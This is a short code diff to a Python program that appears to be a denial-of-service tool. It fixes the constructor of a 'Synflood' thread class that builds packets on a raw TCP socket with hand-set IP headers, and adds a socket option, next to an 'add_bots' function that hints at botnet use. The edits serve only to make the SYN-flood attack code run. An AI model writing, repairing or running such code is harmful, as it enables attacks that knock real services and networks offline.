@@ -109,8 +109,8 @@ def add_bots():
 
 
 class Synflood(Thread):
-    def _init_(self, t_ip, t_port, s_ip, s_port):
-        Thread._init_(self)
+    def __init__(self, t_ip, t_port, s_ip, s_port):
+        Thread.__init__(self)
         self.t_ip = t_ip
         self.t_port = t_port
         self.s_ip = s_ip
@@ -118,6 +118,7 @@ class Synflood(Thread):
         self.psh = ''
         self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
         self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         self.packet = self.Building_packet()
 
     def checksum(self):
